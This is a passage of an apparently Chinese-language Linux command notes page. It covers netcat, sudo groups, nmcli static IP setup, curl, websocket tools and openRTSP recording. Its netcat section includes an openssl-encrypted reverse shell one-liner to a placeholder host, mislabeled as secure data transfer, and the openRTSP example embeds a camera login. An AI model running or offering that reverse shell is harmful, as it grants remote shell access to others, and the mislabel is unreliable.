<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p &lt;local_port&gt; -c <span class="string">&quot;nc &lt;destination_host&gt; &lt;destination_port&gt;&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用 SSL&#x2F;TLS：</strong><br>可以使用 <code>openssl</code> 命令来创建安全的加密连接，以保护数据的传输。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkfifo</span> /tmp/ncpipe &amp;&amp; /bin/sh -i &lt; /tmp/ncpipe 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;your_ip&gt;:&lt;your_port&gt; &gt; /tmp/ncpipe; <span class="built_in">rm</span> /tmp/ncpipe</span><br></pre></td></tr></table></figure></li>
</ol>
<p>请谨慎使用 Netcat，确保你了解其功能和用途，以避免滥用或造成安全风险。不同的情况可能需要不同的选项和用法，建议在实际使用之前查阅官方文档和相关资源。</p>
<h2 id="查看ubuntu版本"><a href="#查看ubuntu版本" class="headerlink" title="查看ubuntu版本"></a>查看ubuntu版本</h2><p>您可以使用以下命令来查看 Ubuntu 系统的版本信息：</p>
<ol>
<li><p><strong>查看当前 Ubuntu 版本：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/lsb-release</span><br></pre></td></tr></table></figure>

<p>这些命令将显示当前安装的 Ubuntu 发行版的详细信息，包括发行版的代号、版本号和描述。</p>
</li>
<li><p><strong>查看内核版本：</strong><br>若要查看当前正在运行的内核版本，可以使用 <code>uname</code> 命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -r</span><br></pre></td></tr></table></figure>

<p>这将显示当前正在运行的 Linux 内核的版本号。</p>
</li>
</ol>
<p>请注意，命令的输出可能包含一些其他信息，比如发行版的名称、内核的版本以及其他详细信息。确保查看相关输出，以获取您所需的确切版本信息。</p>
<h2 id="设置用户的默认目录"><a href="#设置用户的默认目录" class="headerlink" title="设置用户的默认目录"></a>设置用户的默认目录</h2><p>在Linux中，要设置用户的默认目录，可以使用用户的配置文件（通常是<code>.bashrc</code> 或 <code>.bash_profile</code>）来更改用户的起始工作目录。这将使用户在登录时进入指定的目录。</p>
<p>以下是设置用户默认目录的步骤：</p>
<ol>
<li><p><strong>确认用户存在：</strong><br>首先，请确保用户已经存在于系统中。您可以使用<code>id</code>命令来检查用户是否存在：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span> &lt;username&gt;</span><br></pre></td></tr></table></figure>
<p>在这里，<code>&lt;username&gt;</code>是要检查的用户名。</p>
</li>
<li><p><strong>选择默认目录：</strong><br>选择您希望将用户设置为默认目录的目录路径。您可以选择任何现有的目录，或者您可以创建一个新的目录。</p>
</li>
<li><p><strong>编辑用户配置文件：</strong><br>对于大多数Linux发行版的bash用户，默认配置文件是 <code>.bashrc</code>。对于登录shell，如通过SSH登录的用户，也可以使用 <code>.bash_profile</code>。选择合适的配置文件来进行更改。</p>
<p>使用文本编辑器（如<code>nano</code>或<code>vim</code>）打开用户的配置文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano ~/.bashrc</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano ~/.bash_profile</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>设置默认目录：</strong><br>在打开的配置文件中，添加以下行，将用户的默认目录设置为您选择的目录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /path/to/your/default/directory</span><br></pre></td></tr></table></figure>
<p>在这里，将 <code>/path/to/your/default/directory</code> 替换为您希望作为默认目录的实际路径。</p>
</li>
<li><p><strong>保存并应用更改：</strong><br>保存文件并退出文本编辑器。</p>
</li>
<li><p><strong>重新登录：</strong><br>让更改生效，用户需要注销并重新登录。请确保用户退出当前会话并重新登录以使更改生效。</p>
</li>
<li><p><strong>验证更改：</strong><br>登录后，您可以使用以下命令来验证用户当前的工作目录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>

<p>如果输出为您设置的默认目录路径，则表示已成功将用户的默认目录更改为您选择的目录。</p>
</li>
</ol>
<p>请注意：</p>
<ul>
<li>在更改用户的配置文件之前，建议备份文件以防止错误。</li>
<li>确保输入正确的目录路径，否则可能会导致登录问题。</li>
<li>更改用户的默认目录可能会影响其在系统中的体验，因此请谨慎进行。确保目录是用户需要经常访问的地方。</li>
</ul>
<p>如果您对更改用户默认目录不确定，或者希望用户保留默认设置，请谨慎执行以上步骤。</p>
<h2 id="将用户加入root目录"><a href="#将用户加入root目录" class="headerlink" title="将用户加入root目录"></a>将用户加入root目录</h2><p>在Linux中，root目录是文件系统的根目录，通常是表示整个文件系统的最顶层目录，标记为<code>/</code>。因为root目录是系统的根，只有超级用户（root用户）有权限直接对其进行修改。一般用户不能直接加入root目录，因为这样会破坏系统的完整性和安全性。</p>
<p>如果您的意思是将用户加入到具有root权限的用户组（通常是<code>sudo</code>组），以便普通用户可以使用<code>sudo</code>命令来临时获得超级用户权限执行某些特权操作，那么可以通过以下步骤实现：</p>
<ol>
<li><p><strong>确认sudo安装：</strong><br>确保<code>sudo</code>程序已经安装在系统中。在大多数Linux发行版中，默认情况下，<code>sudo</code>是已经安装的。</p>
</li>
<li><p><strong>确认用户存在：</strong><br>首先，请确保要将用户添加到<code>sudo</code>组的用户已经存在于系统中。您可以使用<code>id</code>命令来检查用户是否存在：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span> &lt;username&gt;</span><br></pre></td></tr></table></figure>
<p>在这里，<code>&lt;username&gt;</code>是要检查的用户名。</p>
</li>
<li><p><strong>将用户添加到sudo组：</strong><br>在终端中，使用<code>usermod</code>命令来将用户添加到<code>sudo</code>组。运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> usermod -aG <span class="built_in">sudo</span> &lt;username&gt;</span><br></pre></td></tr></table></figure>
<p>在这里，将<code>&lt;username&gt;</code>替换为您要添加到<code>sudo</code>组的实际用户名。</p>
<p><code>-aG</code>选项用于将用户添加到附加组，以确保用户不会被从其他组中删除。</p>
</li>
<li><p><strong>验证更改：</strong><br>添加用户到<code>sudo</code>组后，他们可以使用<code>sudo</code>命令临时获得超级用户权限。</p>
<p>用户可以尝试使用<code>sudo</code>来运行某个需要root权限的命令，例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ls</span> /root</span><br></pre></td></tr></table></figure>

<p>系统将提示用户输入其自己的密码（而不是root密码），以验证他们的身份。验证通过后，用户将可以以超级用户权限执行命令。</p>
</li>
</ol>
<p>请注意：</p>
<ul>
<li>为用户授予<code>sudo</code>权限时，请确保仅为信任的用户授予该权限，以防止滥用和安全问题。</li>
<li>直接修改root目录的权限或将普通用户设置为root用户的权限是非常危险的，会导致系统完全失去安全性和稳定性。因此，不应该这样做。</li>
<li>只有需要执行特权操作时，用户才应该使用<code>sudo</code>命令。在正常情况下，应该使用普通用户权限运行大多数命令，以确保系统的安全性。</li>
</ul>
<h2 id="du-查看隐藏目录大小"><a href="#du-查看隐藏目录大小" class="headerlink" title="du 查看隐藏目录大小"></a>du 查看隐藏目录大小</h2><p>在 Linux 中，你可以使用 <code>du</code> 命令来查看隐藏目录（以<code>.</code>开头的目录）的大小。<code>du</code> 命令用于估算文件和目录的磁盘使用情况，并可以通过递归地对目录进行操作来查看目录及其子目录的大小。</p>
<p>要查看隐藏目录的大小，可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du -h -d 1 /path/to/directory/.*</span><br></pre></td></tr></table></figure>

<p>其中，<code>/path/to/directory</code> 是要查看的目录所在的路径。在命令末尾的 <code>.*</code> 表示匹配以<code>.</code>开头的目录，这样就能够查看隐藏目录的大小。</p>
<p><code>-h</code> 参数用于显示人类可读的格式，以便更容易阅读文件大小，该参数将以KB、MB、GB等单位显示容器大小。<code>-d 1</code> 参数用于指定深度，表示只查看当前目录下一级的子目录大小。</p>
<p>如果你想查看所有隐藏目录的详细信息，可以加上 <code>-a</code> 参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du -ah -d 1 /path/to/directory/.*</span><br></pre></td></tr></table></figure>

<p>这将列出所有隐藏目录及其大小的详细信息。</p>
<p>请注意，由于隐藏目录通常位于用户家目录或系统目录中，可能需要超级用户权限（使用 <code>sudo</code>）才能查看某些隐藏目录的大小。</p>
<h2 id="scp-指定远程端口号"><a href="#scp-指定远程端口号" class="headerlink" title="scp 指定远程端口号"></a>scp 指定远程端口号</h2><p>在 <code>scp</code> 命令中，默认使用 SSH 协议进行文件传输，SSH 协议的默认端口号是 22。如果你需要指定远程主机的不同端口号，可以使用 <code>-P</code> 参数来指定。</p>
<p>格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P &lt;port&gt; &lt;source&gt; &lt;destination&gt;</span><br></pre></td></tr></table></figure>

<p>其中，<code>&lt;port&gt;</code> 是你想要指定的远程端口号，<code>&lt;source&gt;</code> 是源文件路径，<code>&lt;destination&gt;</code> 是目标文件路径。</p>
<p>示例，假设你想将本地的 <code>example.txt</code> 文件传输到远程主机 <code>remote-host</code> 的 <code>/tmp</code> 目录，并且远程 SSH 端口号是 2222，可以执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2222 example.txt remote-host:/tmp</span><br></pre></td></tr></table></figure>

<p>这将使用 SSH 协议将 <code>example.txt</code> 文件传输到远程主机的 <code>/tmp</code> 目录，并且指定使用 SSH 端口号 2222 进行连接。</p>
<h2 id="curl-发送body数据"><a href="#curl-发送body数据" class="headerlink" title="curl 发送body数据"></a>curl 发送body数据</h2><p>在 Linux 中，可以使用 curl 命令发送包含请求体（body）数据的 HTTP 请求。以下是几种常见的方式来发送 body 数据：</p>
<ol>
<li><strong>通过命令行参数指定数据</strong>：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -d <span class="string">&#x27;body_data&#x27;</span> http://example.com</span><br></pre></td></tr></table></figure>

<p>在上述示例中，使用 <code>-d</code> 参数指定了请求体数据为 ‘body_data’，并使用 <code>-X POST</code> 指定了请求方法为 POST。您可以根据需要修改请求方法和请求体数据。</p>
<ol start="2">
<li><strong>通过文件指定数据</strong>：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data-binary @file.txt http://example.com</span><br></pre></td></tr></table></figure>

<p>在上述示例中，使用 <code>--data-binary</code> 参数指定了要发送的文件为 file.txt，文件中的内容将作为请求体数据发送给服务器。</p>
<ol start="3">
<li><strong>通过标准输入（stdin）指定数据</strong>：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;body_data&#x27;</span> | curl -X POST -d @- http://example.com</span><br></pre></td></tr></table></figure>

<p>在上述示例中，使用 <code>echo</code> 命令将数据发送到 curl 的标准输入，并通过 <code>-d @-</code> 参数告诉 curl 从标准输入中读取数据作为请求体。</p>
<p>这些是使用 curl 命令在 Linux 发送带有请求体数据的 HTTP 请求的常见方式。根据您的需求和使用场景，选择适合的方式来发送请求体数据。</p>
<p>希望这些示例对您有所帮助！如果您有更多问题，请随时提问。</p>
<h2 id="curl-建立websocket连接"><a href="#curl-建立websocket连接" class="headerlink" title="curl 建立websocket连接"></a>curl 建立websocket连接</h2><p>curl 是一个命令行工具，它主要用于发送 HTTP 请求，并不直接支持建立 WebSocket 连接。然而，您可以使用 curl 的 <code>--header</code> 选项自定义请求头来模拟 WebSocket 握手过程，从而与服务器建立一个简单的 WebSocket 连接。请注意，这种方式只适用于简单的 WebSocket 连接，不支持完整的 WebSocket 协议。</p>
<p>以下是一个示例，展示如何使用 curl 建立一个简单的 WebSocket 连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -i -N \</span><br><span class="line">  -H <span class="string">&quot;Connection: Upgrade&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Upgrade: websocket&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Sec-WebSocket-Version: 13&quot;</span> \</span><br><span class="line">  http://example.com/websocket</span><br></pre></td></tr></table></figure>

<p>在上述示例中，<code>-i</code> 选项用于输出响应头信息，<code>-N</code> 选项用于禁用数据缓冲。通过 <code>-H</code> 选项，我们自定义了多个请求头，包括 <code>Connection</code>、<code>Upgrade</code>、<code>Sec-WebSocket-Key</code> 和 <code>Sec-WebSocket-Version</code>。其中，<code>Sec-WebSocket-Key</code> 的值为 “SGVsbG8sIHdvcmxkIQ&#x3D;&#x3D;”，<code>Sec-WebSocket-Version</code> 的值为 “13”。这些请求头是模拟 WebSocket 握手过程所需的头信息。</p>
<p>需要注意的是，上述方式只是模拟了 WebSocket 握手过程，它并不能处理 WebSocket 协议的数据交换。要实现完整的 WebSocket 功能，通常需要使用专门的 WebSocket 客户端库或编程语言的 WebSocket 库来建立和处理 WebSocket 连接。</p>
<p>如果您需要使用 WebSocket 连接进行数据交换，建议使用专门的 WebSocket 客户端库，如 WebSocket++、Boost.Beast、libwebsockets 等，或使用支持 WebSocket 的编程语言库，如 JavaScript 的 WebSocket API、Python 的 websocket 模块等。</p>
<p>希望这些信息对您有所帮助！如果您有更多问题，请随时提问。</p>
<h2 id="linux-建立websocket连接的工具"><a href="#linux-建立websocket连接的工具" class="headerlink" title="linux 建立websocket连接的工具"></a>linux 建立websocket连接的工具</h2><p>在 Linux 环境下，可以使用一些特定的工具来建立 WebSocket 连接。以下是几个常用的工具：</p>
<ol>
<li><p><strong>wscat</strong>: wscat 是一个用于 WebSocket 测试和调试的命令行工具，它提供了建立 WebSocket 连接、发送和接收消息的功能。您可以使用 npm（Node Package Manager）安装 wscat：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g wscat</span><br></pre></td></tr></table></figure>

<p>安装完成后，可以使用以下命令建立 WebSocket 连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wscat -c ws://example.com</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>websocat</strong>: websocat 是一个功能强大的命令行工具，可以用于建立 WebSocket 连接并进行数据交换。它支持 WebSocket 客户端和服务器模式，并提供了各种选项和功能。您可以从其官方网站下载并安装 websocat：<a target="_blank" rel="noopener" href="https://github.com/vi/websocat">https://github.com/vi/websocat</a></p>
<p>安装完成后，可以使用以下命令建立 WebSocket 连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">websocat ws://example.com</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>wsc</strong>: wsc 是另一个用于 WebSocket 测试和调试的命令行工具，类似于 wscat。您可以从其官方网站下载并安装 wsc：<a target="_blank" rel="noopener" href="https://github.com/danielstjules/wsc">https://github.com/danielstjules/wsc</a></p>
<p>安装完成后，可以使用以下命令建立 WebSocket 连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsc -c ws://example.com</span><br></pre></td></tr></table></figure></li>
</ol>
<p>这些工具都提供了在命令行中建立 WebSocket 连接并进行数据交换的功能。您可以根据自己的需求选择适合的工具来建立 WebSocket 连接和测试您的 WebSocket 服务器。</p>
<p>希望这些信息对您有所帮助！如果您有更多问题，请随时提问。</p>
<h2 id="nmcli-修改指定连接名"><a href="#nmcli-修改指定连接名" class="headerlink" title="nmcli 修改指定连接名"></a>nmcli 修改指定连接名</h2><p>要使用 <code>nmcli</code> 命令修改指定连接的名称，可以按照以下步骤进行操作：</p>
<ol>
<li><p>确定要修改的连接名称：首先，确定你要修改的网络连接的当前名称。你可以使用 <code>nmcli connection show</code> 命令查看所有连接的列表和详细信息。</p>
</li>
<li><p>使用 <code>nmcli connection modify</code> 命令修改连接名称：运行以下命令来修改指定连接的名称：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection modify &lt;current-connection-name&gt; connection.id &lt;new-connection-name&gt;</span><br></pre></td></tr></table></figure>

<p>将 <code>&lt;current-connection-name&gt;</code> 替换为当前连接的名称，<code>&lt;new-connection-name&gt;</code> 替换为新的连接名称。</p>
<p>例如，要将名称为 “old-name” 的连接名称修改为 “new-name”，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection modify old-name connection.id new-name</span><br></pre></td></tr></table></figure>
</li>
<li><p>重新激活连接以使更改生效：运行以下命令以激活已修改的连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection up &lt;new-connection-name&gt;</span><br></pre></td></tr></table></figure>

<p>将 <code>&lt;new-connection-name&gt;</code> 替换为你修改后的新连接名称。</p>
</li>
</ol>
<p>完成上述步骤后，指定的连接将使用新的名称。你可以使用 <code>nmcli connection show</code> 命令来验证连接的状态和详细信息。</p>
<p>请注意，这些步骤中的修改仅针对连接的名称。如果你还需要修改其他连接配置（如 IP 地址、子网掩码、默认网关等），请参考先前提供的相关说明。</p>
<p>希望这些步骤对你有帮助！如有更多问题，请随时提问。</p>
<h2 id="nmcli-修改指定连接的ip"><a href="#nmcli-修改指定连接的ip" class="headerlink" title="nmcli 修改指定连接的ip"></a>nmcli 修改指定连接的ip</h2><p>要使用 <code>nmcli</code> 命令修改指定连接的 IP 地址，可以按照以下步骤进行操作：</p>
<ol>
<li><p>确定要修改的连接名称：首先，确定你要修改的网络连接的名称。你可以使用 <code>nmcli connection show</code> 命令查看所有连接的列表和详细信息。</p>
</li>
<li><p>使用 <code>nmcli connection modify</code> 命令修改连接配置：运行以下命令来修改指定连接的 IP 地址配置：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection modify &lt;connection-name&gt; ipv4.method manual ipv4.addresses &lt;ip-address&gt;/&lt;subnet-mask&gt; ipv4.gateway &lt;gateway-address&gt; ipv4.dns &lt;dns-server&gt;</span><br></pre></td></tr></table></figure>

<p>在上述命令中，将 <code>&lt;connection-name&gt;</code> 替换为要修改的连接名称，<code>&lt;ip-address&gt;</code> 替换为新的 IP 地址，<code>&lt;subnet-mask&gt;</code> 替换为新的子网掩码，<code>&lt;gateway-address&gt;</code> 替换为新的默认网关的 IP 地址，<code>&lt;dns-server&gt;</code> 替换为新的 DNS 服务器的 IP 地址。</p>
<p>例如，要将连接名称为 “eth0” 的连接配置为使用静态 IP 地址 “192.168.1.100&#x2F;24”，默认网关为 “192.168.1.1”，DNS 服务器为 “8.8.8.8”，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection modify eth0 ipv4.method manual ipv4.addresses 192.168.1.100/24 ipv4.gateway 192.168.1.1 ipv4.dns 8.8.8.8</span><br></pre></td></tr></table></figure>
</li>
<li><p>激活连接以使更改生效：运行以下命令以激活已修改的连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection up &lt;connection-name&gt;</span><br></pre></td></tr></table></figure>

<p>将 <code>&lt;connection-name&gt;</code> 替换为你修改的连接的名称。</p>
</li>
</ol>
<p>完成上述步骤后，指定的连接将使用新的 IP 地址、子网掩码、默认网关和 DNS 服务器进行配置。你可以使用 <code>nmcli connection show</code> 命令来验证连接的状态和详细信息。</p>
<p>请注意，这些步骤假定你已经知道要使用的新的 IP 地址、子网掩码、默认网关和 DNS 服务器的正确值。确保将这些值替换为你实际使用的网络配置。</p>
<p>希望这些步骤对你有帮助！如有更多问题，请随时提问。</p>
<h2 id="NetworkManager-配置静态IP"><a href="#NetworkManager-配置静态IP" class="headerlink" title="NetworkManager 配置静态IP"></a>NetworkManager 配置静态IP</h2><p>在 Debian 系统中使用 NetworkManager 配置静态 IP 地址，可以通过以下步骤进行操作：</p>
<ol>
<li><p>确保 NetworkManager 安装和运行：首先，确保你的系统已安装 NetworkManager，并且 NetworkManager 服务正在运行。如果没有安装，你可以使用以下命令安装 NetworkManager：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install network-manager</span><br></pre></td></tr></table></figure>
</li>
<li><p>打开 NetworkManager 配置文件：使用文本编辑器打开 NetworkManager 的主要配置文件 <code>/etc/NetworkManager/NetworkManager.conf</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/NetworkManager/NetworkManager.conf</span><br></pre></td></tr></table></figure>
</li>
<li><p>确认 <code>managed</code> 选项的值：在配置文件中找到 <code>managed</code> 选项，并确保其值为 <code>true</code>。这将告诉 NetworkManager 管理所有网络接口的配置。</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[main]</span></span><br><span class="line"><span class="attr">plugins</span>=ifupdown,keyfile</span><br><span class="line"></span><br><span class="line"><span class="section">[ifupdown]</span></span><br><span class="line"><span class="attr">managed</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>创建一个新的网络连接：使用 <code>nmcli</code> 命令创建一个新的网络连接，并指定连接的类型、名称和设备。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection add <span class="built_in">type</span> ethernet con-name &lt;connection-name&gt; ifname &lt;interface-name&gt; ipv4.method manual ipv4.addresses &lt;ip-address&gt;/&lt;subnet-mask&gt; ipv4.gateway &lt;gateway-address&gt; ipv4.dns &lt;dns-server&gt;</span><br></pre></td></tr></table></figure>

<p>在上述命令中，将 <code>&lt;connection-name&gt;</code> 替换为连接的名称，<code>&lt;interface-name&gt;</code> 替换为网络接口的名称（如 eth0、enp0s3 等），<code>&lt;ip-address&gt;</code> 替换为静态 IP 地址，<code>&lt;subnet-mask&gt;</code> 替换为子网掩码，<code>&lt;gateway-address&gt;</code> 替换为默认网关的 IP 地址，<code>&lt;dns-server&gt;</code> 替换为 DNS 服务器的 IP 地址。</p>
<p>例如，创建名为 “static-eth0” 的静态以太网连接，IP 地址为 “192.168.1.100&#x2F;24”，默认网关为 “192.168.1.1”，DNS 服务器为 “8.8.8.8”，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection add <span class="built_in">type</span> ethernet con-name static-eth0 ifname eth0 ipv4.method manual ipv4.addresses 192.168.1.100/24 ipv4.gateway 192.168.1.1 ipv4.dns 8.8.8.8</span><br></pre></td></tr></table></figure>
</li>
<li><p>激活静态连接：使用 <code>nmcli</code> 命令激活刚创建的静态连接。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection up &lt;connection-name&gt;</span><br></pre></td></tr></table></figure>

<p>将 <code>&lt;connection-name&gt;</code> 替换为之前创建的静态连接的名称。</p>
</li>
</ol>
<p>完成上述步骤后，NetworkManager 将使用你指定的静态 IP 地址、子网掩码、默认网关和 DNS 服务器配置网络接口。你可以使用 <code>nmcli connection show</code> 命令来查看连接状态和详细信息。</p>
<p>请注意，这些步骤假定你已经知道要使用的静态 IP 地址、子网掩码、默认网关和 DNS 服务器的正确值。确保将这些值替换为你实际使用的网络配置。</p>
<p>希望这些步骤能帮助你成功配置静态 IP 地址！如有更多问题，请随时提问。</p>
<h2 id="openRTSP-录制视频"><a href="#openRTSP-录制视频" class="headerlink" title="openRTSP 录制视频"></a>openRTSP 录制视频</h2><p>在 Linux 上使用 OpenRTSP 工具录制视频，你可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openRTSP -4 -D &lt;duration&gt; -F &lt;output_file&gt; &lt;RTSP_URL&gt;</span><br><span class="line"></span><br><span class="line">openRTSP  -b 5000000 -D 0 -F ./0715.mp4 rtsp://admin:a1234567@192.169.7.125:554</span><br></pre></td></tr></table></figure>

<p>解释一下这些参数的含义：</p>
<ul>
<li><code>-b</code>: 设置文件输出缓冲区</li>
<li><code>-4</code>: 强制使用 IPv4 进行通信。</li>
<li><code>-D &lt;duration&gt;</code>: 指定录制的时长（以秒为单位）。你可以设置具体的录制时间，或使用 <code>-D 0</code> 来录制直到手动停止。</li>
<li><code>-F &lt;output_file&gt;</code>: 指定输出文件的路径和文件名。例如，<code>/path/to/output.mp4</code>。</li>
<li><code>&lt;RTSP_URL&gt;</code>: RTSP 服务器的 URL，指定要录制的流的位置。</li>
</ul>
<p>示例命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openRTSP -4 -D 60 -F /path/to/output.mp4 rtsp://example.com/live/stream</span><br></pre></td></tr></table></figure>

<p>这将从指定的 RTSP URL 开始录制视频，并将其保存到指定的输出文件中。录制时长为 60 秒。</p>
<p>请注意，OpenRTSP 工具会尝试从 RTSP 服务器获取媒体流并将其保存为文件。确保你具有从服务器获取流的权限，并且服务器正确配置以提供流媒体数据。如果录制的媒体流有加密或其他保护机制，你可能需要提供相应的凭证或密钥。</p>
<p>另外，OpenRTSP 生成的视频文件可能采用 MPEG4 格式进行编码，你可以使用适当的视频播放器或转码工具来播放或转换录制的视频文件。</p>
<h2 id="linux-资源监控-第三方工具"><a href="#linux-资源监控-第三方工具" class="headerlink" title="linux 资源监控 第三方工具"></a>linux 资源监控 第三方工具</h2><p>在Linux系统上，有许多第三方工具可以用于资源监控。以下是一些常用的推荐工具：</p>
<ol>
<li><p><strong>top</strong>: <code>top</code> 是一个基本的命令行工具，用于实时监控系统的进程活动和资源使用情况。它显示了CPU使用率、内存使用情况、进程列表等信息，并按照CPU使用率进行排序。</p>
</li>
<li><p><strong>htop</strong>: <code>htop</code> 是 <code>top</code> 命令的增强版本，提供了更直观的界面和更多的功能。它支持鼠标交互，并提供了更详细的系统信息和进程管理选项。</p>
</li>
<li><p><strong>nmon</strong>: <code>nmon</code> 是一个全面的系统监控工具，可以提供对CPU、内存、磁盘、网络等各个方面的实时数据监测和报告。它以交互式的方式显示系统状态，并可以生成历史数据报告供后续分析。</p>
</li>
<li><p><strong>Glances</strong>: <code>Glances</code> 是一个跨平台的系统监控工具，提供了实时的系统信息和性能指标。它以终端界面形式展示，支持多种插件和扩展，可以监控CPU、内存、磁盘、网络、传感器等方面的数据。</p>
</li>
<li><p><strong>sar</strong>: <code>sar</code>（System Activity Reporter）是一个强大的系统性能监测工具，可以收集并报告系统的各种资源使用情况。它可以生成详细的报告，包括CPU使用率、内存使用情况、磁盘IO、网络流量等指标。</p>
</li>
<li><p><strong>iftop</strong>: <code>iftop</code> 是一个网络流量监控工具，可以实时显示网络接口的流量使用情况。它以交互式的方式展示流量信息，并按流量大小排序。</p>
</li>
</ol>
<p>这些工具都提供了不同层次的资源监控和系统性能分析功能。根据你的需求和个人喜好，选择适合你的工具进行资源监控。</p>
<hr>
